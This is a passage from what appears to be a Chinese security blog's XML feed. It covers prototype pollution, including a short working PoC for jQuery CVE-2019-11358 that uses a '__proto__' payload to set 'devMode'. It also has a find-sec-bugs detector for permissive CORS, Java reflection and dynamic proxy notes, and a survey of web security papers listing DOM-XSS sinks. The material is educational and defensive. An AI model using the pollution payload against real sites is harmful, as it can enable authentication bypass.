题外话，当时没想清楚为啥在return之前删除可以在后面删除污染，实际上是一个简单的先后问题，即在request的时候，我们污染了sourceURL，接着造成代码执行（先），在执行时，污染源被清除（后），返回系统命令执行结果，这样之后的调用就不会受到原型链污染的影响了。 jQuery的原型污染(CVE-2019-11358)jQuery 3.4.0以下版本（不包括3.4.0）存在原型污染漏洞。主要原因可以参考奇安信代码卫士的“jQuery CVE-2019-11358 原型污染漏洞分析和修复建议”一文。 Sink出现在src/core.js代码jQuery.extend函数的180-185行： 180行是一个递归调用，这里可以看到extend()参数有deep，clone，copy三个，接着target[name]=copy中，如果name和copy可控的话就可以进行污染了。 这两个变量当然是可控的，向上看到155-160行： arguments就是传进来的参数，先赋值给options，接着options的key就是name，value就是copy。 因此可以构造如下PoC： 12let a = $.extend(true, &#123;&#125;, JSON.parse('&#123;"__proto__": &#123;"devMode": true&#125;&#125;'))console.log(&#123;&#125;.devMode); // true 可以看到，之所以说jQuery原型污染的影响不大，是因为这是一个前端漏洞，即使有漏洞，攻击者也需要根据网站（源码审计）产生EXP，当然，如果网站依赖于某些类的某些属性/方法做身份验证或其他的什么事情（例如PoC里的devMode），那么后果还是很严重的。 参考链接 JavaScript原型链污染，https://xz.aliyun.com/t/2735 深入理解 JavaScript Prototype 污染攻击，https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html After three years of silence, a new jQuery prototype pollution vulnerability emerges once again，https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/ jQuery CVE-2019-11358 原型污染漏洞分析和修复建议, https://www.anquanke.com/post/id/177093]]></content>
      <categories>
        <category>Web安全-JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spotbugs源码学习&添加安全规则]]></title>
    <url>%2Fwhitebox-spotbugs%E6%B7%BB%E5%8A%A0%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%99%2F</url>
    <content type="text"><![CDATA[因为帮我内推阿里的师傅告诉我以后可能要做源码审计的工作，先学习一下spotbugs和find-sec-bugs的扫描规则实现，并且尝试添加一个规则。 添加扫描规则——添加一个Detector添加扫描规则主要是继承Detector，本文介绍以下几种主要的Detector： OpcodeStackDetector检查每一个Java虚拟机操作码（继承其中的sawOpcode(int seen)，seen即操作吗int表示），其中可以获取调用的方法名——getNameConstantOperand()，获取调用者——getClassConstantOperand()，获取函数调用的参数——stack.getStackItem(0)。可以做类似于正则匹配的简单扫描工具。 例如扫描registry.addMapping.addMapping(&quot;/**&quot;).allowedOrigins(&quot;*&quot;)： 1234567891011121314151617181920212223242526public class CorsRegistryCORSDetector extends OpcodeStackDetector &#123; //... @Override public void sawOpcode(int seen) &#123; //检测调用方法名 if (seen == Const.INVOKEVIRTUAL &amp;&amp; getNameConstantOperand().equals("allowedOrigins")) &#123; // 检测调用对象 if ("org/springframework/web/servlet/config/annotation/CorsRegistration".equals(getClassConstantOperand())) &#123; OpcodeStack.Item item = stack.getStackItem(0); // 因为allowedOrigins参数时Strings... 所以不能直接提取而需要自己通过字节码提取 if(item.isArray()) &#123; String[] strings=getStringArray(item); String pattern="*"; for (String s: strings) &#123; if (s.equals(pattern)) &#123; bugReporter.reportBug(new BugInstance(this, "PERMISSIVE_CORS", HIGH_PRIORITY) .addClassAndMethod(this).addSourceLine(this)); break; &#125; &#125; &#125; &#125; &#125; &#125; //...&#125; 以上是我为find-sec-bugs提交的一个真实的Detector，其中有一个坑就是allowedOrigins()方法的参数是变长参数（实际上是一个数组），如果参数是String或是定长参数的话，直接用stack.getStackItem(0)就可以拿到参数了，现在的话就需要自己写getStringArray(item)方法，具体解决代码见find-sec-bugs#472 BasicInjectionDetector该Detector以每次调用（invoke）为单位进行代码审计，通过污点传播技术，判断调用敏感函数时判断参数是否为用户可控（可以参考com.h3xstream.findsecbugs.file.PathTraversalDetector.java） 也可继承后需重写getInjectionPoint()和getPriorityFromTaintFrame()方法，直接判断是否存在调用以及判断风险等级，这时退化成OpcodeStackDetector，例如，我们要检测CORS漏洞： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class CorsRegistryCORSDetector extends BasicInjectionDetector &#123; private static final String PERMISSIVE_CORS = "PERMISSIVE_CORS"; private static final String CORS_REGISTRY_CLASS = "org.springframework.web.servlet.config.annotation.CorsRegistration"; // 需要获取函数原型 private static final InvokeMatcherBuilder CORS_REGISTRY_ALLOWED_ORIGINS_METHOD = invokeInstruction() .atClass(CORS_REGISTRY_CLASS).atMethod("allowedOrigins") .withArgs("([Ljava/lang/String;)Lorg/springframework/web/servlet/config/annotation/CorsRegistration;"); public CorsRegistryCORSDetector(BugReporter bugReporter) &#123; super(bugReporter); &#125; /** * 每次调用时都会用该函数判断是否存在漏洞 * invoke：表示一次调用 */ @Override protected InjectionPoint getInjectionPoint(InvokeInstruction invoke, ConstantPoolGen cpg, InstructionHandle handle) &#123; assert invoke != null &amp;&amp; cpg != null; // 可以通过一下方法获取InvokeMatcherBuilder的class、method、Signature // System.out.println(invoke.getClassName(cpg)); // System.out.println(invoke.getMethodName(cpg)); // System.out.println(invoke.getSignature(cpg)); if (CORS_REGISTRY_ALLOWED_ORIGINS_METHOD.matches(invoke, cpg)) &#123; return new InjectionPoint(new int[] &#123; 0 &#125;, PERMISSIVE_CORS); &#125; return InjectionPoint.NONE; &#125; /** * 返回危险等级 */ @Override protected int getPriorityFromTaintFrame(TaintFrame fact, int offset) throws DataflowAnalysisException &#123; // Get the value of the Access-Control-Allow-Origin parameter (Second argument from setHeader(2nd,1rst)) Taint originsTaint= fact.getStackValue(0); if (originsTaint.getConstantOrPotentialValue().contains("*")) &#123; //Ignore unknown/dynamic header name return Priorities.HIGH_PRIORITY; &#125; else &#123; return Priorities.IGNORE_PRIORITY; &#125; &#125;&#125; 注意这里getPriorityFromTaintFrame()方法写的是有问题的，还是因为变长参数问题，导致originsTaint.getConstantOrPotentialValue()只能得到数组长度却不能拿到内容。 这里第二个难点就是获取函数原型，可以考虑是用javap：1javap -cp C:\Users\x5651\.m2\repository\org\springframework\spring-webmvc\5.1.6.RELEASE\spring-webmvc-5.1.6.RELEASE.jar -s org.springframework.web.servlet.config.annotation.CorsRegistration]]></content>
      <categories>
        <category>源码安全</category>
      </categories>
      <tags>
        <tag>源码安全</tag>
        <tag>Java</tag>
        <tag>Spotbugs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java反射学习笔记]]></title>
    <url>%2Fjava-java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[获取类对象动态加载一个类123URL[] urls = new URL[] &#123;new URL("file:.\\out\\production\\java_reflect")&#125;;URLClassLoader classLoader = new URLClassLoader(urls);Class clazz = classLoader.loadClass("test.reflect.User"); 寻找一个类1Class clazz = Class.forName("test.reflect.User"); 获取类中的构造方法12345Constructor constructor1=clazz.getConstructor();User user1 = (User) constructor1.newInstance();Constructor constructor2=clazz.getConstructor(String.class, String.class);User user2 = (User) constructor2.newInstance("lili", "123456"); 获取类中属性获取类中公有属性12Field usernameField=clazz.getField("username");usernameField.get(user2); 获取类中私有属性123Field passwordField=clazz.getDeclaredField("password");passwordField.setAccessible(true);passwordField.set(user2, "654321"); 获取类中方法1Method getInfoMethod=clazz.getDeclaredMethod("getInfo", int.class); 调用方法123getInfoMethod.setAccessible(true);String ret= (String) getInfoMethod.invoke(user2, 1);System.out.println(ret); 调用静态方法123Method staticMethod=clazz.getDeclaredMethod("staticMethod");staticMethod.setAccessible(true);staticMethod.invoke(null);]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>反射</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java动态代理学习笔记]]></title>
    <url>%2Fjava-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[用法java动态代理机制可以实现使用一个抽象的中介类对任意类的任意方法进行进行代理，大致原理是运行时生成一个代理类，代理类再调用委托对象。 创建委托对象的接口1234public interface Sell &#123; void sell(); void add();&#125; 创建接口的实现1234567891011public class SellImpl implements Sell &#123; @Override public void sell() &#123; System.out.println("In sell method."); &#125; @Override public void add() &#123; System.out.println("In add method."); &#125;&#125; 实现中介类中介类实现java.lang.reflect.InvocationHandler接口。 123456789101112131415public class MyInvocationHandler implements InvocationHandler &#123; // 委托类对象 private Object object; public DynamicProxy(Object object)&#123; this.object=object; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws InvocationTargetException, IllegalAccessException &#123; System.out.println("Before"); Object result = method.invoke(object, args); System.out.println("After"); return result; &#125;&#125; 用户调用123456789101112131415public class Main &#123; public static void main(String[] args) &#123; //创建中介类实例 MyInvocationHandler inter = new MyInvocationHandler(new SellImpl()); //加上这句将会产生一个$Proxy0.class文件，这个文件即为动态生成的代理类文件 System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles","true"); //获取代理类实例sell Sell sell = (Sell)(Proxy.newProxyInstance(Sell.class.getClassLoader(), new Class[] &#123;Sell.class&#125;, inter)); //通过代理类对象调用代理类方法，实际上会转到invoke方法调用 sell.sell(); sell.add(); &#125;&#125; 原理分析 动态生成代理类，并且动态编译，再通过反射创建对象并加载到内存中： graph LR proxy[Proxy.newProxyInstance] -- JavaPoet --> java[C$Proxy0.java] java -- Compile --> clazz[C$Proxy0.class] clazz -- reflect --> sell[C$Proxy0] 在调用时，C$Proxy0代理InvocationHandler，InvocationHander代理subject。 生成代理类源码newProxyInstance就是将中介类生成代理类源代码的方法，生成的代理类如下，可以看到其包含一个InvocationHander类，实现subject的接口，使用反射调用InvocationHander： 123456789101112131415161718192021222324252627282930import java.lang.Override;import java.lang.reflect.Method;class Proxy0 implements Sell &#123; private InvocationHandler handler; public Proxy0(InvocationHandler handler) &#123; this.handler=handler; &#125; @Override public void add() &#123; try &#123; Method method = MyImpl.Sell.class.getMethod("add"); this.handler.invoke(this, method, null); &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125; @Override public void sell() &#123; try &#123; Method method = MyImpl.Sell.class.getMethod("sell"); this.handler.invoke(this, method, null); &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 可以使用JavaPoet实现，代码来自10分钟看懂动态代理设计模式: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import com.squareup.javapoet.FieldSpec;import com.squareup.javapoet.JavaFile;import com.squareup.javapoet.MethodSpec;import com.squareup.javapoet.TypeSpec;import java.io.File;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import javax.lang.model.element.Modifier;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;public class Proxy &#123; public static Object newProxyInstance(Class subject,InvocationHandler handler) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123; // 生成proxy.java TypeSpec.Builder typeSpecBuilder = TypeSpec.classBuilder("Proxy0") .addSuperinterface(subject); FieldSpec fieldSpec = FieldSpec.builder(InvocationHandler.class, "handler", Modifier.PRIVATE).build(); typeSpecBuilder.addField(fieldSpec); MethodSpec constructorMethodSpec = MethodSpec.constructorBuilder() .addModifiers(Modifier.PUBLIC) .addParameter(InvocationHandler.class, "handler") .addStatement("this.handler=handler") .build(); typeSpecBuilder.addMethod(constructorMethodSpec); Method[] methods = subject.getDeclaredMethods(); for (Method method : methods) &#123; MethodSpec methodSpec = MethodSpec.methodBuilder(method.getName()) .addModifiers(Modifier.PUBLIC) .addAnnotation(Override.class) .returns(method.getReturnType()) .addCode("try &#123;\n") .addStatement("\t$T method = " + subject.getName() + ".class.getMethod(\"" + method.getName() + "\")", Method.class) // 为了简单起见，这里参数直接写死为空 .addStatement("\tthis.handler.invoke(this, method, null)") .addCode("&#125; catch(Exception e) &#123;\n") .addCode("\te.printStackTrace();\n") .addCode("&#125;\n") .build(); typeSpecBuilder.addMethod(methodSpec); &#125; JavaFile javaFile = JavaFile.builder("MyImpl", typeSpecBuilder.build()).build(); // 为了看的更清楚，我将源码文件生成到桌面 String srcPath="./MyProxy"; javaFile.writeTo(new File(srcPath)); // 编译源代码 // TODO // 加载进内存并反射创建对象 // TODO return obj; &#125;&#125; 编译Proxy0的源代码12345678910public class JavaCompiler &#123; public static void compile(File javaFile) throws IOException &#123; javax.tools.JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler(); StandardJavaFileManager fileManager = javaCompiler.getStandardFileManager(null, null, null); Iterable iterable = fileManager.getJavaFileObjects(javaFile); javax.tools.JavaCompiler.CompilationTask task = javaCompiler.getTask(null, fileManager, null, null, null, iterable); task.call(); fileManager.close(); &#125;&#125; 在Proxy.newProxyInstance()中调用： 1JavaCompiler.compile(new File(srcPath+"/MyImpl/Proxy0.java")); 加载进内存并创建对象使用URLClassLoader加载.class文件 1234567File filpath=new File("");URL[] urls = new URL[] &#123;new URL("file:"+filpath.getAbsoluteFile()+"\\MyProxy\\")&#125;;URLClassLoader classLoader = new URLClassLoader(urls);Class clazz = classLoader.loadClass("MyImpl.Proxy0");Constructor constructor = clazz.getConstructor(InvocationHandler.class);constructor.setAccessible(true); //不懂 为什么已经是public的方法还需要setAccessibleObject obj = constructor.newInstance(handler); 使用可以像系统内置的那样设置动态代理 1Sell sell = (Sell)Proxy.newProxyInstance(Sell.class, new MyInvocationHandler(new SellImpl())); 参考文献 10分钟看懂动态代理设计模式，https://juejin.im/post/5a99048a6fb9a028d5668e62 Java动态代理，https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>反射</tag>
        <tag>动态代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2014-2019Web安全研究方向调查报告]]></title>
    <url>%2F%E5%AD%A6%E6%9C%AF-%E5%AD%A6%E6%9C%AF%E5%9C%882014-2019Web%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91%E7%A0%94%E7%A9%B6%E6%83%85%E5%86%B5%2F</url>
    <content type="text"><![CDATA[About本文列出四大安全会议（USENIX、CCS、NDSS和S&amp;P）近5年来与Web安全有关的研究，已发现web方向的研究点。 XSS研究热点聚焦在DOM-XSS上： Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*我们通过污点跟踪技术寻找客户端的XSS问题(感觉跟“Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting”的研究很像) Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*什么是DOM型XSS： 怎么防御： 方法我们使用了向V8引擎注入污点技术，具体来说，我们在每个输入的字符串上增加了一个标记，最后看这些标记是否会被document.write()等函数(sink function)带出。在中间过程中我们需要考虑encodeURI等函数，他们应使标记失效。 sink function： document.write() document.writeln() eval() 设置src属性的setAttribute 设置href属性的setAttribute 设置style属性的setAttribute 设置事件监听属性（onload/onerror/…）的setAttribute 在setTimeout和setInterval中的string2function 对document.cookie赋值 对document.location赋值 使标记失效的函数 escape escape不编码字符有69个：*，+，-，.，/，@，_，0-9，a-z，A-Z encodeURI encodeURI不编码字符有82个：!，#，$，&amp;，’，(，)，*，+，,，-，.，/，:，;，=，?，@，_，~，0-9，a-z，A-Z encodeURIComponent encodeURIComponent不编码字符有71个：!， ‘，(，)，*，-，.，_，~，0-9，a-z，A-Z encodeHTML 需要自己写，将字符串转换成html实体编码 实验结果我们与其他静态工具做对比，发现BurpSuite只发现了10%的问题，但是发现了一些其他我们没有发现的问题，而其他工具存在相当高的误报率——95% 相关链接 https://github.com/wrmelicher/ChromiumTaintTracking S. Lekies, B. Stock, and M. Johns, “25 million flows later: large-scale detection of DOM-based XSS,” in Proc. CCS, 2013, pp. 1193–1204. Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14目前对XSS的防御依赖于字符串检测，本文通过实验揭示了这种方法不能抵御所有的XSS攻击，为此，本文提出了一种基于污点跟踪和感知的XSS过滤器。 Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14Second-Order漏洞是指攻击载荷首先存储在应用服务器上，接着在其他操作时触发的漏洞，本文第一个提出了检测该漏洞的静态代码分析方法，其通过检测连接数据库或对web应用内存的读取和写入操作检测该问题。 EXP GenerationNAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*本文构造了一个可拓展的动静结合的web漏洞生成框架，第一步，使用符号执行构建各个模块的行为模型，第二步，构建应用并且使用爬虫获取网站路径，同时使用动态符号执行最大化代码覆盖范围 相关资料 https://github.com/aalhuz/navex Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*我们设计了一套EXP生成工具，以提高web注入漏洞的识别能力。为此该工具基于应用的数据流，数据库模型和本机函数等应对web应用程序的多模块，用户输入和多层架构的挑战。 DoSRampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18高度复杂的DoS攻击只需要少量请求就可导致大量资源消耗，为此，我们设计工具Rampart，它通过统计方法和函数级别的程序分析方法，合成并部署过滤器来阻止DoS攻击。 Tail Attacks on Web Applications, ccs17本文介绍了一种新型的DDoS攻击，这种攻击利用了网络应用的复杂性和依赖于分布式的特性，使网络响应大于1秒，我们构建了一个模型来检测这一攻击并且提出了一种防御方法。 Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18JavaScript的单线程执行模型使得基于JavaScript的web服务器特别容易受到ReDoS攻击。因此我们对2846个流行的网站进行分析，并且发现了25个之前未知的流行模块漏洞。 The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18正则表达式是导致拒绝服务的新原因，本文研究了ReDoS的三个方面：实际中超线性正则表达式（super-linear regex）的使用率，他们如何预防DoS攻击以及他们如何被修复。本文发现大量的JavaScript和Python依靠正则表达式，同时反模式（anti-patterns）有很少的漏报但是有很多误报，因此这些反模式是必要但不充分的。最后发现对待超线性的表达式，开发者愿意修改它而不是截断输入或是写新的。 ReScue: crafting regular expression DoS attacks, ase18本文介绍了一种三阶段灰盒分析技术ReScure，它可以自动生成ReDoS字符串。它通过遗传算法选择种子，接着使用正则表达式算法选择具有最大搜索时间的字符串。 备注：南大计算机做的研究，好像也在搞移动测试 CookieWho left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18cookie容易受到XSS攻击，为此浏览器形成了各种保护机制和政策，本文能通过一个强制执行第三方请求的框架自动化评估这些防御机制的有效性，我们评估了7个浏览器的策略实现和46个浏览器插件，我们发现即使是内置的保护机制也可以被许多新技术绕过。 思考：Android Browser是不是也有这类问题？ Cookies Lack Integrity: Real-World Implications (survey), usenix15设置了secure标志的cookie会被https加密传输，然而cookie的完整性仍然会受到攻击（没有应用HSTS），本文旨在了解攻击者如何进行一个cookie注入攻击。 The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16由于不使用HTTPS，http存在中间人攻击的问题，本文总结了这些问题。 CSPCCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17CSP(Content Security Policy)是W3C设计的用来防御内容注入的标准，但是其静态白名单的策略被先前的研究质疑，本文介绍了一种CSP的拓展CCSP，旨在克服静态白名单所来带来的限制同时避免大幅度修改原先的CSP。 CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16CSP是防御XSS攻击的好方式，但是据了解只有0.002%的网站使用了CSP，为此我们设计了工具CSPAutoGen，他为每个网站训练一个模板，再基于模板产生CSP规则。 CORSWe Still Don’t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18开发者提出一些解决方法（比如JSONP）来绕过同源策略，这些方法同时引入了安全问题，CORS是一种更加规范的机制，但是本文通过实证研究发现，CORS的设计和部署受到许多新的安全问题影响：1）CORS放宽了跨域写权限2）开发人员不了解CORS导致错误配置。 AndroidTime Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19本文发现web应用存在的问题仍然会在Android中出现，但是很多移动端浏览器并没有遵从安全准则（HTTP Header）。 被调查的HTTP Header： Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19本文通过众包方式了解到Android应用程序中开放端口的普及度为15.3%；本文还开发了一种新的静态诊断工具，显示61.8%的开放端口应用程序完全是由嵌入式sdk开发的，20.7%的应用程序使用了不安全的API。我们得出关于端口安全的三个结论：（1）脆弱性分析显示了以Instagram，SamsungGear，Skype，和FacebookSDK为首的5种脆弱的模式；（2）众包显示了224个蜂窝网络和2181个WiFi模式；（3）关于对端口进行DoS攻击的实验性演示 FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18Android访问私人信息是否合法取决于应用是否向用户提供了足够的解释，FlowCog从Android视图中抽取相关的语义，再用NLP方法推断语义与给定流是否相关。 相关资料 https: //github.com/SocietyMaster/FlowCog. Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18web app通过post进行跨域请求，安卓的混合应用也会使用这些技术，它拓展了postMessage（我们称为“hybird postMessage”，同时也引入了新的问题——origin stripping vulnerability。本文中我们设计了一个工具来检测这问题。 Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**为了节约算力，很多webAPI的验证工作会在移动端进行，但是如果web端不重复验证的话，就会产生不一致的问题，攻击者可以篡改流量来攻击web应用。本文中，我们提出一个工具：WARDroid，它可以自动化的寻找web端和移动端的不一致问题。具体来说，WARDroid静态分析android app中的http通讯模板，接着通过黑盒测试的方法识别不一致性。 Idea: 可不可以做一个web的？因为web的前后端分离也会造成不一致问题(会议上有人提问)。 Extract Backward HTTP Request Templates Measuring the Insecurity of Mobile Deep Links of Android, usenix17Deep Link是指应用内特殊的URI，它有助于网络到应用的通信，Android推出了两种新方法”App links”和“Intent URLs”用来替换scheme URL，但是没有多少时间，本文调查了2014-2016年google市场的APP，发现新的连接方式并没有带来安全性改善，只有2.2%的应用正确使用了新方法，另外，我们发现了一种新的风险，最后，我们发现了更多的URL劫持的案例。 AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*本文设计AuthScope工具，该工具能够自动执行移动应用程序，并在相应的在线服务中识别出易受攻击的访问控制实现。 Effective Real-Time Android Application Auditing, S&amp;P14本文设计了一套动态审计工具来检查应用是否存在数据泄露问题，降低静态检测的误报率。 Javascriptjs存在的安全问题包含了XSS，因此这里排除了XSS。 CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19本文设计了一套js代码生成工具，它可以生成语义和语法上都正确的JavaScript片段，因此可以用于fuzz来发现JavaScript引擎的漏洞。具体来说，该工具将种子分解为代码片段，每一个片段用一段约束来标记，这些约束表示它与其他代码块在一起的条件。 SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18本文发现Nodejs的很多模块存在命令注入攻击的问题，因此本文提出了Synode，一种结合静态分析和动态的方法，使开发者安全的使用这些有问题的库。具体来说，Synode静态分析哪些值会传播到API中，并且在安装时修复；动态运行时，它截恶意请求防止他们传递到api中。 相关工作 X. Jin, X. Hu, K. Ying, W. Du, H. Yin, and G. N. Peri. Code injection attacks on HTML5-based mobile apps: Characterization, detection and mitigation. In Conference on Computer and Communications Security, pages 66–77, 2014 P. Saxena, D. Molnar, and B. Livshits. SCRIPTGARD: automatic context-sensitive sanitization for large-scale legacy web applications. In CCS, pages 601–614, 2011. M. Ter Louw and V. N. Venkatakrishnan. Blueprint: Robust prevention of cross-site scripting attacks for existing browsers. In Sec. and Privacy, pages 331–346, 2009. S. Guarnieri and B. Livshits. GATEKEEPER: mostly static enforcement of security and reliability policies for JavaScript code. In USENIX Security, pages 151–168, 2009. Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17本文对Alexa有排行的网站镜像进行了调查，发现web开发者会应用很多第三方库（比如jQuery），这些库的旧版本存在漏洞。 The Unexpected Dangers of Dynamic JavaScript (survey), usenix15JS存在XSS等安全性问题，为此本文进行了实证研究了它的影响，并且提出了安全防护方法。 ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15现代网站大量依赖JS，这些JS的客户端验证（client-side validation,CSV）存在脆弱性（实际上是逻辑问题），本文提出了一个检测该类问题的系统ZigZag，它是一个代理，透明的检测用户端代码，并且实时的获取执行状态，从中产生控制流和数据，以此识别与攻击相关的操作。 Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14本文开发了工具JsRED，一种用于自动检测重定向脚本注入的新技术，它通过比较当前的JS-lib版本和正常的版本差异判断脚本是否被替换。 Access controlFlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15web应用会出现水平越权的问题，由于很多网站的用户访问控制模型类似，因此我们可以布置一个外部代理（nginx端），然后观察用户的所有流量，然后根据预期的访问控制策略规范来侦测未经授权的访问。 MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14我们实现了工具MACE，通过访问资源时的上下文不一致性来识别水平特权升级漏洞 Automating Isolation and Least Privilege in Web Services, S&amp;P14本文设计了一个防止数据未授权读写的系统Passe，它动态地从开发者提供的测试用例分析数据流和控制流，将应用分离成几个模块，并且将模块放入沙盒中运行。另外，我们将Passe嵌入了Django框架中，我们发现它可以正确地分析96%的策略，同时还可以防御XSS攻击。 Survey能分类的survey已经分到具体的类型中，这里列出与web相关的其他调查。 Same-Origin Policy: Evaluation in Modern Browsers, usenix17SOP-DOM是同源策略的自己，它控制主文档和嵌入文档之间的交互，但是没有正式的规范，本文通过实证研究，发现除了Web Origins之外，SOP-DOM授予的访问权限至少取决于三个属性：嵌入元素（EE）的类型，沙箱（浏览器）和CORS属性。 How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, usenix17本文检查了97-16年的重要网站代码和头信息，以此确定web技术的关键趋势，随后评估与之关联的漏洞，在调查解决他们的安全防御机制。本文发现自2000年以来，JavaScript开始流行，客户端注入的可能性增加，但CSP的部署却没有跟上，另外使用HTTP only cookie的网站更容易遭受XSS。 Fingerprintk-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16攻击者可以在tor网络中实施被动攻击比如，指纹识别，本文提出了基于随机森林的网站指纹识别技术，它能抵抗tor和先进的网站指纹识别防御技术。 Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16恶意网站会使用复杂技术隐藏自身，防止被搜索引擎发现其本质。我们调查了暗网的十大著名技术，并且开发了一种反隐身系统。 JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19如今的浏览器会提供匿名功能隐藏信息，而本文提出了一种自动化推断系统信息（包括软件和硬件）的方法，该方法通过JavaScript引擎收集各种数据，再根据这些属性创建模板，如果这个模板的某一属性在各个系统上都不相同则它是一个依赖于环境的属性。 etcOn Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16元数据攻击指针对版本控制系统的攻击方法，它欺骗开发者执行意外操作，比如将未经测试的代码合并到生产分支中，或是包含一致漏洞的组件。本文提出了一种防御方案，通过维护开发人员的加密签名后的日志环节这些攻击。 Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14本文使用数据挖掘和机器学习的几种技术，来预测一个给定的、未被侵入的网站是否会变得有问题。 Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17本文开发了一个SCANNER的工具，用于检测PHP应用程序中与资源相关的侧信道泄露漏洞——例如一个关于健康的网站，泄露了病人吃药的时间。 Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18本文提出了一种系统，可以再单个浏览会话级别上观察用户行为，从而预测他们是否是攻击型为，已达到提前预防的目的。 Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17本文提出检测CSRF的框架，该框架考虑了web应用的执行流程，数据流以及整体架构，构建一个属性图，然后使用图遍历，发觉潜在的CSRF问题。Deemon自动判断web应用的执行环境，接着无监督的产生动态记录，比如网络交互，服务端执行和数据库操作，使用这些记录Deemon构建一个图模型，他表示捕获的状态转换和数据流；接着遍历这个图来发觉http状态变换，这些变换与CSRF流动现骨干。 Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*我们针对单点登陆(SSO)存在的问题，设计了两种攻击模式CSRF和XSS，并且基于ZAP设计了扫描器，经过实验我们发先它能发现知名网站的安全性问题。 Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14由于缺失文档，判断逻辑漏洞十分困难，现有的工具需要调查源代码或是只适用于小规模应用，而我们利用用户产生的流量产生一个行为序列，接着重用这个序列判断网站是否存在问题。]]></content>
      <categories>
        <category>Web安全-学术</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>学术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器上传绕过总结]]></title>
    <url>%2F%E7%BB%84%E4%BB%B6-%E5%AE%B9%E5%99%A8%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93%2F</url>
